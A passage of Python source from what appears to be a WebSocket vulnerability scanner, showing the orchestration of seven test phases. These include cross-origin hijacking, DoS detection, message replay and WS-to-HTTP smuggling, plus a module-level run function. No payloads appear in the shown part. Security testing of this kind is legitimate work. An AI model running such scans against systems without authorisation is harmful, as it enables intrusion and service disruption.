            all_details = {}
            any_vulnerable = False

            # Phase 1: Discovery
            self._print(f"\n  {BOLD}{YELLOW}[Phase 1/7] Endpoint Discovery{RESET}", YELLOW)
            disc_result = self.discover_endpoints(url)
            if disc_result.get('vulnerable'):
                any_vulnerable = True
            all_findings.extend(disc_result.get('findings', []))
            all_details['discovery'] = disc_result.get('details', {})

            # Get discovered endpoints for further testing
            endpoints = disc_result.get('details', {}).get('endpoints_found', [])
            test_url = endpoints[0].get('ws_url', url) if endpoints else url

            # Phase 2: Auth testing
            self._print(f"\n  {BOLD}{YELLOW}[Phase 2/7] Authentication Testing{RESET}", YELLOW)
            auth_result = self.test_auth(test_url)
            if auth_result.get('vulnerable'):
                any_vulnerable = True
            all_findings.extend(auth_result.get('findings', []))
            all_details['auth'] = auth_result.get('details', {})

            # Phase 3: Message fuzzing
            self._print(f"\n  {BOLD}{YELLOW}[Phase 3/7] Message Fuzzing{RESET}", YELLOW)
            fuzz_result = self.fuzz_messages(test_url)
            if fuzz_result.get('vulnerable'):
                any_vulnerable = True
            all_findings.extend(fuzz_result.get('findings', []))
            all_details['fuzz'] = fuzz_result.get('details', {})

            # Phase 4: Cross-origin
            self._print(f"\n  {BOLD}{YELLOW}[Phase 4/7] Cross-Origin Hijacking{RESET}", YELLOW)
            co_result = self.test_cross_origin(test_url)
            if co_result.get('vulnerable'):
                any_vulnerable = True
            all_findings.extend(co_result.get('findings', []))
            all_details['cross_origin'] = co_result.get('details', {})

            # Phase 5: DoS detection
            self._print(f"\n  {BOLD}{YELLOW}[Phase 5/7] DoS Detection{RESET}", YELLOW)
            dos_result = self.test_dos(test_url)
            if dos_result.get('vulnerable'):
                any_vulnerable = True
            all_findings.extend(dos_result.get('findings', []))
            all_details['dos'] = dos_result.get('details', {})

            # Phase 6: Message replay
            self._print(f"\n  {BOLD}{YELLOW}[Phase 6/7] Message Replay{RESET}", YELLOW)
            replay_result = self.test_message_replay(test_url)
            if replay_result.get('vulnerable'):
                any_vulnerable = True
            all_findings.extend(replay_result.get('findings', []))
            all_details['replay'] = replay_result.get('details', {})

            # Phase 7: WS-to-HTTP smuggling
            self._print(f"\n  {BOLD}{YELLOW}[Phase 7/7] WS-to-HTTP Smuggling{RESET}", YELLOW)
            smuggling_findings = self._test_ws_http_smuggling(test_url)
            all_findings.extend(smuggling_findings)
            all_details['ws_http_smuggling'] = smuggling_findings
            if smuggling_findings:
                any_vulnerable = True

            return {
                'vulnerable': any_vulnerable,
                'findings': all_findings,
                'details': all_details,
                'scan_type': 'ws_full',
            }

        scan_func = scan_map.get(scan_type)
        if scan_func:
            return scan_func()

        return {
            'vulnerable': False,
            'findings': [],
            'details': {"error": f"Unknown scan type: {scan_type}"},
            'scan_type': scan_type,
        }


# ============================================================================
# HELPER: Simple ThreadPoolExecutor wrapper for compatibility
# ============================================================================

from concurrent.futures import ThreadPoolExecutor, as_completed as as_completed_ws

ThreadPoolExecutorWS = ThreadPoolExecutor

# ============================================================================
# MODULE-LEVEL RUN FUNCTION (ZYLON FUSION INTEGRATION)
# ============================================================================

def run(target, scan_type='full', **kwargs):
    """Module-level run function for ZYLON FUSION integration"""
    engine = WebSocketEngine()
    return engine.run(target, scan_type=scan_type, **kwargs)
